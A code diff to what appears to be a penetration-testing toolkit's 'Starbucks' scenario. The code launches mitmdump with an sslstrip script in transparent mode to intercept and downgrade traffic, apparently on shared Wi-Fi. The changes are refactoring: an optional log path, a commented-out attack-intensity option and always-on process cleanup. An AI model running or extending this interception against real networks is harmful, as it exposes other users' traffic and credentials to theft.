@@ -1,11 +1,11 @@
-import sys
+import atexit
 import os
 import shlex
 import subprocess
 from pwntk.base_scenario import BaseScenario
-from pwntk.utils.environment import is_dev
+# from pwntk.utils.environment import is_dev
 from pwntk.utils.file import timestamp_file
-from pwntk.utils.logger import print_kill_pid, print_check
+from pwntk.utils.logger import print_kill_pid, print_check, print_executing
 from pwntk.scenarios.starbucks.setup import ensure_scripts_folder, download_scripts
 from pwntk.vars import vars
 
@@ -19,7 +19,7 @@ class StarbucksScenario(BaseScenario):
     # programs = ["mitmdump", "ettercap"]
     programs = ["mitmdump"]
     files = [f"{vars.get('pwntk_home')}/mitmproxy/scripts/sslstrip.py"]
-    mode: int = 2
+    # mode: int = 2
     path: str = None
     ignored_domains = ["facebook", "google", "gmail", "apple"]
 
@@ -33,20 +33,23 @@ class StarbucksScenario(BaseScenario):
 
     def run(self):
         ignored_domains_regex = self.build_ignored_regex()
-        path_to_file = os.path.join(self.path, timestamp_file("mitmdump.log"))
-        cmd = f"{self.programs[0]} --scripts {self.files[0]} --mode transparent -w {path_to_file} --ignore-hosts {ignored_domains_regex}"
-        print(f"Executing: {cmd}")
+        cmd = f"{self.programs[0]} --scripts {self.files[0]} --mode transparent --ignore-hosts {ignored_domains_regex}"
+        if self.path is not None:
+            path_to_file = os.path.join(self.path, timestamp_file("mitmdump.log"))
+            cmd += f" -w {path_to_file}"
+        print_executing(cmd)
         mitmdump = subprocess.Popen(shlex.split(cmd))
+        print_check(f"Started PID: {mitmdump.pid}")
         processes.append(mitmdump)
 
     def validate_options(self, parser):
-        parser.add_argument("-m", "--mode", action="store", default=2,
-                            help="Violence level of attack (1,2,3). The default is 2")
-        parser.add_argument("-p", "--path", action="store", required=True,
+        # parser.add_argument("-m", "--mode", action="store", default=2,
+        #                    help="Violence level of attack (1,2,3). The default is 2")
+        parser.add_argument("-p", "--path", action="store",
                             help="Path of output")
 
         args, _ = parser.parse_known_args()
-        self.mode = args.mode
+        # self.mode = args.mode
         self.path = args.path
 
 
@@ -61,7 +64,4 @@ def clean_up():
         print_check("Finished cleaning processes")
 
 
-if is_dev():
-    import atexit
-
-    atexit.register(clean_up)
+atexit.register(clean_up)
